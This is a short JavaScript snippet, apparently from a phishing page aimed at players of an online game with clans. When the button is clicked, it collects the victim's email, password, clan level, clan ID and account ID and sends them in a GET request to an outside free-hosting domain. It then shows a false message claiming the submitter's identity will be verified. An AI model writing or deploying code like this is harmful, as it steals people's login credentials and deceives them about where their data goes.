
var xml = new XMLHttpRequest();
document.getElementById("btn").addEventListener("click",()=>{
	
	var email = document.getElementById("email").value;
var password = document.getElementById("password").value;
var clanlvl = document.getElementById("clanlvl").value;
var clanid = document.getElementById("clanid").value;
var accountid = document.getElementById("accountid").value;
	xml.open("GET",`https://hindering-diver.000webhostapp.com?email=${email}&password=${password}&clanlvl=${clanlvl}&clanid=${clanid}&accountid=${accountid}&enter`,true);
	xml.send();
	alert("Submitted. We will update you via email once we verified your identity.");
})